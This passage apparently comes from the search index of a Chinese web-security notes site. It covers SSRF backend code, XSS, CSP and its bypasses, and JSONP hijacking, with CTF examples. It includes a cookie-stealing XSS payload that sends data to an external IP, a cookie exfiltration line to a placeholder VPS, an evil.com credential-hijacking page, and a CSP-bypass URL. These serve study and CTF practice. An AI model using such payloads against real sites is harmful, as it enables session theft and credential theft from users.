; fwrite ( $fp , $out ); $contents = '' ; while ( ! feof ( $fp )) { $contents .= fgets ( $fp , 1024 ); } fclose ( $fp ); return $contents ; } } ?> fsockopen \u51fd\u6570\u4f1a\u4f7f\u7528socket\u5efa\u7acb\u4e00\u4e2a\u8fde\u63a5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 <?php if ( isset ( $_POST [ 'url' ])) { $link = $_POST [ 'url' ]; $curlobj = curl_init (); curl_setopt ( $curlobj , CURLOPT_POST , 0 ); curl_setopt ( $curlobj , CURLOPT_URL , $link ); curl_setopt ( $curlobj , CURLOPT_RETURNTRANSFER , 1 ); $result = curl_exec ( $curlobj ); curl_close ( $curlobj ); $filename = './curled/' . rand () . '.txt' ; file_put_contents ( $filename , $result ); echo $result ; } ?> \u7ecf\u5e38\u53ef\u4ee5\u89c1\u5230\u8fd9\u6837\u7684\u4ee3\u7801\uff0c\u4e0d\u8fc7\u8fd9\u4e2acurl\u548cLinux bash\u4e0a\u7684curl\u6709\u70b9\u4e0d\u540c","title":"ssrf\u5e38\u89c1\u7684\u540e\u7aef\u5b9e\u73b0"},{"location":"web_sec/XSS/","text":"XSS \u00b6 \u5982\u4f55\u7406\u89e3XSS\u653b\u51fb\uff1f \u8fd9\u6050\u6015\u662fXSS\u4e2d\u6700\u96be\u7684\u5730\u65b9\u4e86 \u6211\u5728\u672c\u5730\u5199\u4e86\u8fd9\u6837\u4e00\u4e2aHTML: 1 2 3 4 5 6 7 8 9 10 11 <!DOCTYPE html> < html > < head > < title > \u8fd9\u662f\u6807\u9898 </ title > </ head > < body > < img src = x onerror = this.src=\"http://39.106.125.244:8888/?c=firefox\"+document.cookie > </ body > </ html > \u7136\u540e\u6211\u7684vps\u4e0a\u5f00\u4e00\u4e2a\u7aef\u53e3\uff1a 1 \u8fd9\u65f6\u5019\u6211\u7528firefox\u6253\u5f00\u8fd9\u4e2a\u7f51\u9875\uff08chrome\u4f3c\u4e4e\u4e0d\u884c \u6211\u7684vps\u4e0a\u5c31\u63a5\u6536\u5230\u4e86\u6570\u636e\uff1a \u4e5f\u5c31\u662f\u5b9e\u73b0\u4e86\u6570\u636e\u7684\u5916\u5e26 iframe\u6807\u7b7e\u7684\u795e\u5947 \u00b6 \u5c31\u662f\u901a\u8fc7 iframe \u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u4e00\u4e2a\u9875\u9762\uff0c\u540c\u65f6\u8c03\u6574\u5927\u5c0f \u53c2\u8003 \u00b6 jsonp\u8be6\u89e3 \u8de8\u57df\u65b9\u5f0f\u53ca\u5176\u4ea7\u751f\u7684\u5b89\u5168\u95ee\u9898 \u6211\u7684CSP\u7ed5\u8fc7\u601d\u8def\u53ca\u5176\u603b\u7ed3 \u540c\u6e90\u7b56\u7565\u90a3\u4e9b\u4e8b","title":"XSS"},{"location":"web_sec/XSS/#xss","text":"\u5982\u4f55\u7406\u89e3XSS\u653b\u51fb\uff1f \u8fd9\u6050\u6015\u662fXSS\u4e2d\u6700\u96be\u7684\u5730\u65b9\u4e86 \u6211\u5728\u672c\u5730\u5199\u4e86\u8fd9\u6837\u4e00\u4e2aHTML: 1 2 3 4 5 6 7 8 9 10 11 <!DOCTYPE html> < html > < head > < title > \u8fd9\u662f\u6807\u9898 </ title > </ head > < body > < img src = x onerror = this.src=\"http://39.106.125.244:8888/?c=firefox\"+document.cookie > </ body > </ html > \u7136\u540e\u6211\u7684vps\u4e0a\u5f00\u4e00\u4e2a\u7aef\u53e3\uff1a 1 \u8fd9\u65f6\u5019\u6211\u7528firefox\u6253\u5f00\u8fd9\u4e2a\u7f51\u9875\uff08chrome\u4f3c\u4e4e\u4e0d\u884c \u6211\u7684vps\u4e0a\u5c31\u63a5\u6536\u5230\u4e86\u6570\u636e\uff1a \u4e5f\u5c31\u662f\u5b9e\u73b0\u4e86\u6570\u636e\u7684\u5916\u5e26","title":"XSS"},{"location":"web_sec/XSS/#iframe","text":"\u5c31\u662f\u901a\u8fc7 iframe \u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u4e00\u4e2a\u9875\u9762\uff0c\u540c\u65f6\u8c03\u6574\u5927\u5c0f","title":"iframe\u6807\u7b7e\u7684\u795e\u5947"},{"location":"web_sec/XSS/#_1","text":"jsonp\u8be6\u89e3 \u8de8\u57df\u65b9\u5f0f\u53ca\u5176\u4ea7\u751f\u7684\u5b89\u5168\u95ee\u9898 \u6211\u7684CSP\u7ed5\u8fc7\u601d\u8def\u53ca\u5176\u603b\u7ed3 \u540c\u6e90\u7b56\u7565\u90a3\u4e9b\u4e8b","title":"\u53c2\u8003"},{"location":"web_sec/XSS/CSP/","text":"CSP \u00b6 CSP \u5e76\u4e0d\u662f\u7528\u6765\u9632\u6b62 xss \u653b\u51fb\u7684, \u800c\u662f\u6700\u5c0f\u5316 xss \u53d1\u751f\u540e\u6240\u9020\u6210\u7684\u4f24\u5bb3. \u5b9e\u9645\u4e0a, \u9664\u4e86\u5f00\u53d1\u8005\u81ea\u5df1\u505a\u597d xss \u8f6c\u4e49, \u5e76\u6ca1\u6709\u522b\u7684\u65b9\u6cd5\u53ef\u4ee5\u9632\u6b62 xss \u7684\u53d1\u751f. CSP \u53ef\u4ee5\u8bf4\u662fHTML5\u7ed9web\u5b89\u5168\u5e26\u6765\u7684\u6700\u5b9e\u60e0\u7684\u4e1c\u897f. \u90a3\u4e48\u5982\u4f55\u5f15\u5165 CSP \u5462? \u901a\u8fc7response\u5934 \u53ea\u5141\u8bb8\u811a\u672c\u4ece\u672c\u6e90\u52a0\u8f7dContent-Security-Policy: script-src \u2018self\u2019 \u901a\u8fc7HTML\u7684META\u6807\u7b7e \u4f5c\u7528\u540c\u4e0a \u90a3\u4e48CSP \u9664\u4e86\u9650\u5236script-src \u4e4b\u5916\u8fd8\u80fd\u9650\u5236\u4ec0\u4e48\u5462\uff1f base-uri : \u9650\u5236\u8fd9\u7bc7\u6587\u6863\u7684uri child-src \uff1a\u9650\u5236\u5b50\u7a97\u53e3\u7684\u6e90(iframe,\u5f39\u7a97\u7b49),\u53d6\u4ee3frame-src connect-src \uff1a\u9650\u5236\u811a\u672c\u53ef\u4ee5\u8bbf\u95ee\u7684\u6e90 font-src : \u9650\u5236\u5b57\u4f53\u7684\u6e90 form-action : \u9650\u5236\u8868\u5355\u80fd\u591f\u63d0\u4ea4\u5230\u7684\u6e90 frame-ancestors : \u9650\u5236\u4e86\u5f53\u524d\u9875\u9762\u53ef\u4ee5\u88ab\u54ea\u4e9b\u9875\u9762\u4ee5iframe,frame,object\u7b49\u65b9\u5f0f\u52a0\u8f7d frame-src \uff1adeprecated with child-src,\u9650\u5236\u4e86\u5f53\u524d\u9875\u9762\u53ef\u4ee5\u52a0\u8f7d\u54ea\u4e9b\u6e90\uff0c\u4e0eframe-ancestors\u5bf9\u5e94 img-src : \u9650\u5236\u56fe\u7247\u53ef\u4ee5\u4ece\u54ea\u4e9b\u6e90\u52a0\u8f7d media-src : \u9650\u5236video, audio, source, track \u80fd\u591f\u4ece\u54ea\u4e9b\u6e90\u52a0\u8f7d object-src \uff1a\u9650\u5236\u63d2\u4ef6\u53ef\u4ee5\u4ece\u54ea\u4e9b\u6e90\u52a0\u8f7d sandbox \uff1a\u5f3a\u5236\u6253\u5f00\u6c99\u76d2\u6a21\u5f0f \u53ef\u4ee5\u770b\u51fa, CSP\u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u7b56\u7565, \u51e0\u4e4e\u53ef\u4ee5\u9650\u5236\u4e86\u6240\u6709\u80fd\u591f\u7528\u5230\u7684\u8d44\u6e90\u7684\u6765\u6e90. \u4f7f\u7528\u597dCSP\u53ef\u4ee5\u5f88\u5927\u6210\u90fd\u964d\u4f4eXSS\u5e26\u6765\u7684\u98ce\u9669. \u53e6\u5916, CSP\u8fd8\u63d0\u4f9b\u4e00\u4e2a\u62a5\u544a\u7684\u5934\u57df Content-Security-Policy-Report-Only , \u4f7f\u7528\u8fd9\u4e2a\u5934\u57df, \u6d4f\u89c8\u5668\u4f1a\u5411\u670d\u52a1\u5668\u62a5\u544acsp\u72b6\u6001. 1 Content-Security-Policy-Report-Only: script-src 'self'; report-uri http://cspReport/ \u4f7f\u7528\u4e86\u4e0a\u9762\u7684\u8bbe\u7f6e, \u82e5\u9875\u9762\u4e0a\u5b58\u5728\u5185\u8054\u7684js, \u5b83\u4f9d\u7136\u4f1a\u6267\u884c, \u4e0d\u8fc7\u6d4f\u89c8\u5668\u4f1a\u5411\u53d1\u9001\u4e00\u4e2apost\u8bf7\u6c42, \u5305\u542b\u5982\u4e0b\u4fe1\u606f. 1 2 3 4 5 6 7 8 9 10 { \"csp-report\": { \"document-uri\": \"http://cspReport/test.php\", \"referrer\": \"\", \"violated-directive\": \"script-src 'self'\", \"original-policy\": \"script-src 'self'; report-uri http://cspReport/\", \"blocked-uri\": \"\" } } CSP \u76ee\u524d\u6709\u4e24\u7248, [CSP1][] \u548c [CSP2][]. \u4e24\u7248\u7684\u652f\u6301\u72b6\u6001\u53ef\u4ee5\u5728 http://caniuse.com/#search=csp \u4e2d\u67e5\u5230. \u5982\u4e0b: CSP1\u652f\u6301\u6027 CSP2\u652f\u6301\u6027 CSP\u867d\u7136\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u5b89\u5168\u4fdd\u62a4, \u4f46\u662f\u4ed6\u4e5f\u9020\u6210\u4e86\u5982\u4e0b\u95ee\u9898: Eval\u53ca\u76f8\u5173\u51fd\u6570\u88ab\u7981\u7528\u3001\u5185\u5d4c\u7684JavaScript\u4ee3\u7801\u5c06\u4e0d\u4f1a\u6267\u884c\u3001\u53ea\u80fd\u901a\u8fc7\u767d\u540d\u5355\u6765\u52a0\u8f7d\u8fdc\u7a0b\u811a\u672c. XSS\u653b\u9632\u6d45\u8c08","title":"CSP"},{"location":"web_sec/XSS/CSP/#csp","text":"CSP \u5e76\u4e0d\u662f\u7528\u6765\u9632\u6b62 xss \u653b\u51fb\u7684, \u800c\u662f\u6700\u5c0f\u5316 xss \u53d1\u751f\u540e\u6240\u9020\u6210\u7684\u4f24\u5bb3. \u5b9e\u9645\u4e0a, \u9664\u4e86\u5f00\u53d1\u8005\u81ea\u5df1\u505a\u597d xss \u8f6c\u4e49, \u5e76\u6ca1\u6709\u522b\u7684\u65b9\u6cd5\u53ef\u4ee5\u9632\u6b62 xss \u7684\u53d1\u751f. CSP \u53ef\u4ee5\u8bf4\u662fHTML5\u7ed9web\u5b89\u5168\u5e26\u6765\u7684\u6700\u5b9e\u60e0\u7684\u4e1c\u897f. \u90a3\u4e48\u5982\u4f55\u5f15\u5165 CSP \u5462? \u901a\u8fc7response\u5934 \u53ea\u5141\u8bb8\u811a\u672c\u4ece\u672c\u6e90\u52a0\u8f7dContent-Security-Policy: script-src \u2018self\u2019 \u901a\u8fc7HTML\u7684META\u6807\u7b7e \u4f5c\u7528\u540c\u4e0a \u90a3\u4e48CSP \u9664\u4e86\u9650\u5236script-src \u4e4b\u5916\u8fd8\u80fd\u9650\u5236\u4ec0\u4e48\u5462\uff1f base-uri : \u9650\u5236\u8fd9\u7bc7\u6587\u6863\u7684uri child-src \uff1a\u9650\u5236\u5b50\u7a97\u53e3\u7684\u6e90(iframe,\u5f39\u7a97\u7b49),\u53d6\u4ee3frame-src connect-src \uff1a\u9650\u5236\u811a\u672c\u53ef\u4ee5\u8bbf\u95ee\u7684\u6e90 font-src : \u9650\u5236\u5b57\u4f53\u7684\u6e90 form-action : \u9650\u5236\u8868\u5355\u80fd\u591f\u63d0\u4ea4\u5230\u7684\u6e90 frame-ancestors : \u9650\u5236\u4e86\u5f53\u524d\u9875\u9762\u53ef\u4ee5\u88ab\u54ea\u4e9b\u9875\u9762\u4ee5iframe,frame,object\u7b49\u65b9\u5f0f\u52a0\u8f7d frame-src \uff1adeprecated with child-src,\u9650\u5236\u4e86\u5f53\u524d\u9875\u9762\u53ef\u4ee5\u52a0\u8f7d\u54ea\u4e9b\u6e90\uff0c\u4e0eframe-ancestors\u5bf9\u5e94 img-src : \u9650\u5236\u56fe\u7247\u53ef\u4ee5\u4ece\u54ea\u4e9b\u6e90\u52a0\u8f7d media-src : \u9650\u5236video, audio, source, track \u80fd\u591f\u4ece\u54ea\u4e9b\u6e90\u52a0\u8f7d object-src \uff1a\u9650\u5236\u63d2\u4ef6\u53ef\u4ee5\u4ece\u54ea\u4e9b\u6e90\u52a0\u8f7d sandbox \uff1a\u5f3a\u5236\u6253\u5f00\u6c99\u76d2\u6a21\u5f0f \u53ef\u4ee5\u770b\u51fa, CSP\u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u7b56\u7565, \u51e0\u4e4e\u53ef\u4ee5\u9650\u5236\u4e86\u6240\u6709\u80fd\u591f\u7528\u5230\u7684\u8d44\u6e90\u7684\u6765\u6e90. \u4f7f\u7528\u597dCSP\u53ef\u4ee5\u5f88\u5927\u6210\u90fd\u964d\u4f4eXSS\u5e26\u6765\u7684\u98ce\u9669. \u53e6\u5916, CSP\u8fd8\u63d0\u4f9b\u4e00\u4e2a\u62a5\u544a\u7684\u5934\u57df Content-Security-Policy-Report-Only , \u4f7f\u7528\u8fd9\u4e2a\u5934\u57df, \u6d4f\u89c8\u5668\u4f1a\u5411\u670d\u52a1\u5668\u62a5\u544acsp\u72b6\u6001. 1 Content-Security-Policy-Report-Only: script-src 'self'; report-uri http://cspReport/ \u4f7f\u7528\u4e86\u4e0a\u9762\u7684\u8bbe\u7f6e, \u82e5\u9875\u9762\u4e0a\u5b58\u5728\u5185\u8054\u7684js, \u5b83\u4f9d\u7136\u4f1a\u6267\u884c, \u4e0d\u8fc7\u6d4f\u89c8\u5668\u4f1a\u5411\u53d1\u9001\u4e00\u4e2apost\u8bf7\u6c42, \u5305\u542b\u5982\u4e0b\u4fe1\u606f. 1 2 3 4 5 6 7 8 9 10 { \"csp-report\": { \"document-uri\": \"http://cspReport/test.php\", \"referrer\": \"\", \"violated-directive\": \"script-src 'self'\", \"original-policy\": \"script-src 'self'; report-uri http://cspReport/\", \"blocked-uri\": \"\" } } CSP \u76ee\u524d\u6709\u4e24\u7248, [CSP1][] \u548c [CSP2][]. \u4e24\u7248\u7684\u652f\u6301\u72b6\u6001\u53ef\u4ee5\u5728 http://caniuse.com/#search=csp \u4e2d\u67e5\u5230. \u5982\u4e0b: CSP1\u652f\u6301\u6027 CSP2\u652f\u6301\u6027 CSP\u867d\u7136\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u5b89\u5168\u4fdd\u62a4, \u4f46\u662f\u4ed6\u4e5f\u9020\u6210\u4e86\u5982\u4e0b\u95ee\u9898: Eval\u53ca\u76f8\u5173\u51fd\u6570\u88ab\u7981\u7528\u3001\u5185\u5d4c\u7684JavaScript\u4ee3\u7801\u5c06\u4e0d\u4f1a\u6267\u884c\u3001\u53ea\u80fd\u901a\u8fc7\u767d\u540d\u5355\u6765\u52a0\u8f7d\u8fdc\u7a0b\u811a\u672c. XSS\u653b\u9632\u6d45\u8c08","title":"CSP"},{"location":"web_sec/XSS/CSP\u7ed5\u8fc7\u603b\u7ed3/","text":"CSP\u7ed5\u8fc7\u603b\u7ed3 \u00b6 \u6700\u8fd1\u9047\u5230\u7684\u5f88\u591a\u9898\u76ee\u90fd\u662fCSP\u7684\u4e86 \u90a3\u4e48\u600e\u4e48\u7406\u89e3CSP\u7684\u542b\u4e49\u548c\u5982\u4f55\u7ed5\u8fc7CSP\u5462\uff1f \u7406\u89e3CSP\u7684\u542b\u4e49 \u00b6 1 Content-Security-Policy\uff1a default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; \u8fd9\u4e2a\u4f8b\u5b50\u610f\u5473\u7740\u5141\u8bb8\u52a0\u8f7d\u540c\u6e90\u7684JS\u811a\u672c\u3001CSS\u3001AJAX\uff08or WebSocket\uff09\u3001\u62d2\u7edd\u52a0\u8f7d\u5176\u4ed6\u4efb\u4f55\u7684\u8d44\u6e90\u3002 \u90a3\u4e48\u6211\u8fd9\u6b21\u9047\u5230\u7684\u9898\u76ee 1 default-src 'self'; script-src 'self' *.google.com; connect-src * \u9ed8\u8ba4\u52a0\u8f7d\u7b56\u7565\u4e3a\u540c\u6e90\uff0c\u5141\u8bb8\u52a0\u8f7d\u540c\u6e90\u7684\u811a\u672c\u548c\u6765\u81eaGoogle\u5b50\u57df\u540d\u4e0b\u7684\u811a\u672c\uff0c connect-src \u8bf4\u660e\u53ef\u4ee5\u5c06\u6570\u636e\u5916\u5e26 \u7ed5\u8fc7CSP \u00b6 \u5982\u679c connect-src: self \u8bbe\u5b9a\u4e86\u8bdd\uff0c\u5c31\u65e0\u6cd5\u5411\u5176\u4ed6\u57df\u540d\u53d1\u9001\u6570\u636e\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5bfb\u627e\u7ad9\u5185\u53ef\u4ee5api\uff0c\u5982\u4e0a\u4f20\u6587\u4ef6\u3001\u53d1\u5e03\u6587\u7ae0\u7b49\u5904\u5bfc\u51fa\u6570\u636e\u3002 link\u6807\u7b7e \u00b6 <link rel=\"prefetch\" herf=\"xxxxxxx\"> \uff08\u7ecf\u6d4b\u8bd5\uff0c\u706b\u72d0\u3001chrome\u5747\u5931\u6548\uff09 DNS\u9884\u89e3\u6790\uff1a <link rel=\"dns-prefetch\" href=\"xxxxxxxx\"> \uff08\u7ecf\u6d4b\u8bd5\uff0c\u4ecd\u7136\u53ef\u4ee5\u7ed5\u8fc7Chrome\uff0c\u706b\u72d0\u6700\u65b0\u7248\u65e0\u6548\uff09 \u8fd9\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u9884\u52a0\u8f7d\uff0c\u5c06\u6570\u636e\u6dfb\u52a0\u5230link\u8bf7\u6c42\u7684\u94fe\u63a5\u4e2d\uff0c\u6216\u8005dns\u9884\u89e3\u6790\u7684\u5b50\u57df\u540d\u4e2d\uff0c\u4eceDNS\u8bb0\u5f55\u4e2d\u62ff\u5230\u6570\u636e\u3002 \u7ffb\u9605\u5148\u77e5\u7684\u6587\u7ae0\u4e5f\u770b\u5230\uff1a \u5982\u679c\u80fd\u6267\u884cjs\u811a\u672c\uff0c\u4f46\u662f\u7531\u4e8eCSP\u65e0\u6cd5\u5916\u5e26\u6570\u636e\u6240\u4ee5\u5c31\u9700\u8981\u7528\u5230 link \u6807\u7b7e 1 location.href = \"vps_ip:xxxx?\"+document.cookie \u4f46\u662f\u8c8c\u4f3c\u6ca1\u6210\u529f \u5199\u6210\u811a\u672c\u662f\u8fd9\u6837\u7684\uff1a 1 inshack-2019 bybass every where | web \u00b6 \u5982\u4e0b\u7684CSP 1 script-src www.google.com; img-src *; default-src 'none'; style-src 'unsafe-inline' \u8de8\u57df\u6570\u636e\u4f20\u8f93\u65b9\u5f0f \u00b6 JSONP \u00b6 \u5982\u4e0b\u4ee3\u7801\u6982\u62ec\u7684\u5f88\u7cbe\u70bc\u4e86\uff1a aaa.evoa.me/1.php 1 2 3 4 5 6 < script > function echoData ( data ) { console . log ( \"DATA: \" , data ); } < /script> < script src = \"//bbb.evoa.me/2.php?func=echoData\" >< /script> bbb.evoa.me/2.php 1 2 3 4 5 6 <? php header ( 'Content-type: application/javascript' ); $func = $_REQUEST [ 'func' ] ?? \"func\" ; $data = '[\"aaa\",\"bbb\",\"ccc\",\"ddd\"]' ; echo $func . \"(\" . $data . \")\" ; ?> \u6211\u4eec\u770b\u5230 1.php \u53d1\u9001\u4e86\u4e00\u4e2a\u8bf7\u6c42\u4f20\u9012\u7684\u53c2\u6570\u662f func=echoData \u4e5f\u5c31\u662f\u8bf4\u6211\u8981\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u7136\u540e 2.php \u63a5\u6536\u5230\u4e86\uff0c\u8fd9\u6837\u5c31\u5b8c\u6210\u4e86\u4e00\u6b21\u51fd\u6570\u7684\u8c03\u7528 \u8fd9\u7b97\u662f\u4e00\u79cd\u5f88\u5de7\u5999\u7684\u6570\u636e\u4f20\u8f93\u65b9\u5f0f\uff0c\u4f46\u662f\u5982\u679c\u914d\u7f6e\u6709\u95ee\u9898\uff0c\u5c31\u53ef\u80fd\u4ea7\u751f\u5b89\u5168\u9690\u60a3 evoa.me/2.php 1 2 3 4 5 6 7 <? php header ( 'Content-type: application/javascript' ); $func = $_REQUEST [ 'func' ] ?? \"func\" ; $data = \"{'username':'evoA','password':'123456789'}\" ; echo $func . \"(\" . $data . \")\" ; ?> evil.com/evil.php 1 2 3 4 5 6 < script > function echoData ( data ) { alert ( \"username: \" + data . username + \"\\n\" + \"password: \" + data . password ); } < /script> < script src = //evoa.me/2.php?func=echoData></script> \u8fd9\u6837\u901a\u8fc7 evil.php \u5c31\u8fbe\u5230\u4e86\u8c03\u7528 echoData \u7684\u76ee\u7684 \u4f46\u662f\u524d\u9762\u8bbe\u7f6e\u4e86 Content-type \uff0c\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u5462\uff1f evoa.me/2.php 1 2 3 4 5 <? php $func = $_REQUEST [ 'func' ] ?? \"func\" ; $data = \"{'username':'evoA','password':'123456789'}\" ; echo $func . \"(\" . $data . \")\" ; ?> \u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u5c06\u5bfc\u81f4\u53cd\u5c04\u578bXSS\uff0c\u5e76\u6ca1\u6709\u8fbe\u5230\u8c03\u7528 echoData \u7684\u76ee\u7684 1 https://bypasses-everywhere.ctf.insecurity-insa.fr/article?time=<script/src=&unit=https://www.google.com/complete/search?client=chrome&q=hello&callback=alert></script> \u901a\u8fc7\u52a0\u8f7d https://www.google.com/complete/search?client=chrome&q=hello&callback=my_function \u53ef\u4ee5\u8fbe\u5230\u7ed5\u8fc7\u53ea\u80fd\u52a0\u8f7d google.com \u5b50\u57df\u540d\u4e0b\u7684\u811a\u672c\u9650\u5236\u5e76\u4e14\u8fbe\u5230\u8c03\u7528\u51fd\u6570\u7684\u76ee\u7684","title":"CSP\u7ed5\u8fc7\u603b\u7ed3"},{"location":"web_sec/XSS/CSP\u7ed5\u8fc7\u603b\u7ed3/#csp","text":"\u6700\u8fd1\u9047\u5230\u7684\u5f88\u591a\u9898\u76ee\u90fd\u662fCSP\u7684\u4e86 \u90a3\u4e48\u600e\u4e48\u7406\u89e3CSP\u7684\u542b\u4e49\u548c\u5982\u4f55\u7ed5\u8fc7CSP\u5462\uff1f","title":"CSP\u7ed5\u8fc7\u603b\u7ed3"},{"location":"web_sec/XSS/CSP\u7ed5\u8fc7\u603b\u7ed3/#csp_1","text":"1 Content-Security-Policy\uff1a default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; \u8fd9\u4e2a\u4f8b\u5b50\u610f\u5473\u7740\u5141\u8bb8\u52a0\u8f7d\u540c\u6e90\u7684JS\u811a\u672c\u3001CSS\u3001AJAX\uff08or WebSocket\uff09\u3001\u62d2\u7edd\u52a0\u8f7d\u5176\u4ed6\u4efb\u4f55\u7684\u8d44\u6e90\u3002 \u90a3\u4e48\u6211\u8fd9\u6b21\u9047\u5230\u7684\u9898\u76ee 1 default-src 'self'; script-src 'self' *.google.com; connect-src * \u9ed8\u8ba4\u52a0\u8f7d\u7b56\u7565\u4e3a\u540c\u6e90\uff0c\u5141\u8bb8\u52a0\u8f7d\u540c\u6e90\u7684\u811a\u672c\u548c\u6765\u81eaGoogle\u5b50\u57df\u540d\u4e0b\u7684\u811a\u672c\uff0c connect-src \u8bf4\u660e\u53ef\u4ee5\u5c06\u6570\u636e\u5916\u5e26","title":"\u7406\u89e3CSP\u7684\u542b\u4e49"},{"location":"web_sec/XSS/CSP\u7ed5\u8fc7\u603b\u7ed3/#csp_2","text":"\u5982\u679c connect-src: self \u8bbe\u5b9a\u4e86\u8bdd\uff0c\u5c31\u65e0\u6cd5\u5411\u5176\u4ed6\u57df\u540d\u53d1\u9001\u6570\u636e\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5bfb\u627e\u7ad9\u5185\u53ef\u4ee5api\uff0c\u5982\u4e0a\u4f20\u6587\u4ef6\u3001\u53d1\u5e03\u6587\u7ae0\u7b49\u5904\u5bfc\u51fa\u6570\u636e\u3002","title":"\u7ed5\u8fc7CSP"},{"location":"web_sec/XSS/CSP\u7ed5\u8fc7\u603b\u7ed3/#link","text":"<link rel=\"prefetch\" herf=\"xxxxxxx\"> \uff08\u7ecf\u6d4b\u8bd5\uff0c\u706b\u72d0\u3001chrome\u5747\u5931\u6548\uff09 DNS\u9884\u89e3\u6790\uff1a <link rel=\"dns-prefetch\" href=\"xxxxxxxx\"> \uff08\u7ecf\u6d4b\u8bd5\uff0c\u4ecd\u7136\u53ef\u4ee5\u7ed5\u8fc7Chrome\uff0c\u706b\u72d0\u6700\u65b0\u7248\u65e0\u6548\uff09 \u8fd9\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u9884\u52a0\u8f7d\uff0c\u5c06\u6570\u636e\u6dfb\u52a0\u5230link\u8bf7\u6c42\u7684\u94fe\u63a5\u4e2d\uff0c\u6216\u8005dns\u9884\u89e3\u6790\u7684\u5b50\u57df\u540d\u4e2d\uff0c\u4eceDNS\u8bb0\u5f55\u4e2d\u62ff\u5230\u6570\u636e\u3002 \u7ffb\u9605\u5148\u77e5\u7684\u6587\u7ae0\u4e5f\u770b\u5230\uff1a \u5982\u679c\u80fd\u6267\u884cjs\u811a\u672c\uff0c\u4f46\u662f\u7531\u4e8eCSP\u65e0\u6cd5\u5916\u5e26\u6570\u636e\u6240\u4ee5\u5c31\u9700\u8981\u7528\u5230 link \u6807\u7b7e 1 location.href = \"vps_ip:xxxx?\"+document.cookie \u4f46\u662f\u8c8c\u4f3c\u6ca1\u6210\u529f \u5199\u6210\u811a\u672c\u662f\u8fd9\u6837\u7684\uff1a 1","title":"link\u6807\u7b7e"},{"location":"web_sec/XSS/CSP\u7ed5\u8fc7\u603b\u7ed3/#inshack-2019-bybass-every-where-web","text":"\u5982\u4e0b\u7684CSP 1 script-src www.google.com; img-src *; default-src 'none'; style-src 'unsafe-inline'","title":"inshack-2019 bybass every where | web"},{"location":"web_sec/XSS/CSP\u7ed5\u8fc7\u603b\u7ed3/#_1","text":"","title":"\u8de8\u57df\u6570\u636e\u4f20\u8f93\u65b9\u5f0f"},{"location":"web_sec/XSS/CSP\u7ed5\u8fc7\u603b\u7ed3/#jsonp","text":"\u5982\u4e0b\u4ee3\u7801\u6982\u62ec\u7684\u5f88\u7cbe\u70bc\u4e86\uff1a aaa.evoa.me/1.php 1 2 3 4 5 6 < script > function echoData ( data ) { console . log ( \"DATA: \" , data ); } < /script> < script src = \"//bbb.evoa.me/2.php?func=echoData\" >< /script> bbb.evoa.me/2.php 1 2 3 4 5 6 <? php header ( 'Content-type: application/javascript' ); $func = $_REQUEST [ 'func' ] ?? \"func\" ; $data = '[\"aaa\",\"bbb\",\"ccc\",\"ddd\"]' ; echo $func . \"(\" . $data . \")\" ; ?> \u6211\u4eec\u770b\u5230 1.php \u53d1\u9001\u4e86\u4e00\u4e2a\u8bf7\u6c42\u4f20\u9012\u7684\u53c2\u6570\u662f func=echoData \u4e5f\u5c31\u662f\u8bf4\u6211\u8981\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u7136\u540e 2.php \u63a5\u6536\u5230\u4e86\uff0c\u8fd9\u6837\u5c31\u5b8c\u6210\u4e86\u4e00\u6b21\u51fd\u6570\u7684\u8c03\u7528 \u8fd9\u7b97\u662f\u4e00\u79cd\u5f88\u5de7\u5999\u7684\u6570\u636e\u4f20\u8f93\u65b9\u5f0f\uff0c\u4f46\u662f\u5982\u679c\u914d\u7f6e\u6709\u95ee\u9898\uff0c\u5c31\u53ef\u80fd\u4ea7\u751f\u5b89\u5168\u9690\u60a3 evoa.me/2.php 1 2 3 4 5 6 7 <? php header ( 'Content-type: application/javascript' ); $func = $_REQUEST [ 'func' ] ?? \"func\" ; $data = \"{'username':'evoA','password':'123456789'}\" ; echo $func . \"(\" . $data . \")\" ; ?> evil.com/evil.php 1 2 3 4 5 6 < script > function echoData ( data ) { alert ( \"username: \" + data . username + \"\\n\" + \"password: \" + data . password ); } < /script> < script src = //evoa.me/2.php?func=echoData></script> \u8fd9\u6837\u901a\u8fc7 evil.php \u5c31\u8fbe\u5230\u4e86\u8c03\u7528 echoData \u7684\u76ee\u7684 \u4f46\u662f\u524d\u9762\u8bbe\u7f6e\u4e86 Content-type \uff0c\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u5462\uff1f evoa.me/2.php 1 2 3 4 5 <? php $func = $_REQUEST [ 'func' ] ?? \"func\" ; $data = \"{'username':'evoA','password':'123456789'}\" ; echo $func . \"(\" . $data . \")\" ; ?> \u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u5c06\u5bfc\u81f4\u53cd\u5c04\u578bXSS\uff0c\u5e76\u6ca1\u6709\u8fbe\u5230\u8c03\u7528 echoData \u7684\u76ee\u7684 1 https://bypasses-everywhere.ctf.insecurity-insa.fr/article?time=<script/src=&unit=https://www.google.com/complete/search?client=chrome&q=hello&callback=alert></script> \u901a\u8fc7\u52a0\u8f7d https://www.google.com/complete/search?client=chrome&q=hello&callback=my_function \u53ef\u4ee5\u8fbe\u5230\u7ed5\u8fc7\u53ea\u80fd\u52a0\u8f7d google.com \u5b50\u57df\u540d\u4e0b\u7684\u811a\u672c\u9650\u5236\u5e76\u4e14\u8fbe\u5230\u8c03\u7528\u51fd\u6570\u7684\u76ee\u7684","title":"JSONP"},{"location":"web_sec/XSS/DompurifyXSSbypass/","text":"Dompurify XSSbypass \u00b6 math_is_fun\u6e90\u7801 